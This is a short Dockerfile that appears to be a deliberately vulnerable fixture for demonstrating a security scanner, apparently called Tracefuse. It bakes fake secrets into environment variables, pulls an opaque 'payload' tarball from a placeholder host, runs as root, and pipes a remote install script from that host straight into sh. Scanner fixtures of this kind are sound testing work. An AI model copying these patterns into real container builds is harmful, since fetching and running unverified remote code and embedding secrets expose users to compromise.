# DEMO ONLY — intentional Tracefuse findings. All secrets are FAKE/EXAMPLE.
# Nasty Dockerfile patterns for offline demos. DO NOT DEPLOY.

FROM node:latest

WORKDIR /app

# FAKE EXAMPLE secrets baked into the image layer
ENV API_SECRET=FAKE_EXAMPLE_DOCKER_SECRET_DO_NOT_USE
ENV DB_PASSWORD=FAKE_EXAMPLE_PASSWORD_12345

# Opaque remote ADD (EXAMPLE / invalid host)
ADD https://example.invalid/payload-FAKE.tgz /tmp/payload.tgz

COPY package.json ./
USER root
# EXAMPLE — curl|sh installer anti-pattern
RUN curl -fsSL https://example.invalid/install-FAKE.sh | sh
RUN echo "demo-vulnerable FAKE fixture"

CMD ["node", "src/index.js"]
